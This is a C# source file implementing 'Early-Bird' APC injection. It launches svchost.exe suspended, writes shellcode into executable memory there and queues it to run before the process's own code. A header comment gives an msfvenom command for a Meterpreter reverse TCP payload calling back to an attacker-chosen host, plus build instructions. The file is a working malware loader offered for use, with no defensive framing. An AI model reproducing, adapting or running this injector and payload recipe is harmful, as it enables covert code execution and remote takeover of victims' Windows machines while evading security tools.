// =============================================================================
// Early-Bird APC injection
//
// Creates a legitimate process (svchost.exe) in a suspended state, allocates
// shellcode, then queues an APC (QueueUserAPC) pointing at the shellcode before
// the main thread ever runs. When the thread resumes, the APC executes the
// shellcode before the process's own entry point — "early bird".
//
// Shellcode (msfvenom):
//   msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp -o /tmp/sc.cs
//
// Compile (Release, x64):
//   csc /target:exe /platform:x64 /optimize+ /out:apc-injection.exe apc-injection.cs
// =============================================================================

using System;
using System.Runtime.InteropServices;

namespace ApcInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
            uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public int cb;
            public IntPtr lpReserved, lpDesktop, lpTitle;
            public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars;
            public int dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess, hThread;
            public int dwProcessId, dwThreadId;
        }

        const uint CREATE_SUSPENDED = 0x00000004;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            // ── Paste your shellcode here (msfvenom -f csharp) ─────
            byte[] buf = new byte[] { /* shellcode bytes */ };
            // ───────────────────────────────────────────────────────────────────

            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            string target = @"C:\Windows\System32\svchost.exe";
            if (!CreateProcess(null, target, IntPtr.Zero, IntPtr.Zero, false,
                CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
            {
                Console.WriteLine("[-] CreateProcess failed: {0}", Marshal.GetLastWin32Error());
                return;
            }

            IntPtr allocAddr = VirtualAllocEx(pi.hProcess, IntPtr.Zero,
                (uint)buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (allocAddr == IntPtr.Zero) { Console.WriteLine("[-] VirtualAllocEx failed"); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return; }

            IntPtr bytesWritten;
            if (!WriteProcessMemory(pi.hProcess, allocAddr, buf, (uint)buf.Length, out bytesWritten))
            { Console.WriteLine("[-] WriteProcessMemory failed"); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return; }

            IntPtr apc = QueueUserAPC(allocAddr, pi.hThread, IntPtr.Zero);
            if (apc == IntPtr.Zero) { Console.WriteLine("[-] QueueUserAPC failed: {0}", Marshal.GetLastWin32Error()); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return; }

            ResumeThread(pi.hThread);
            Console.WriteLine("[+] APC queued into PID {0}", pi.dwProcessId);

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    }
}
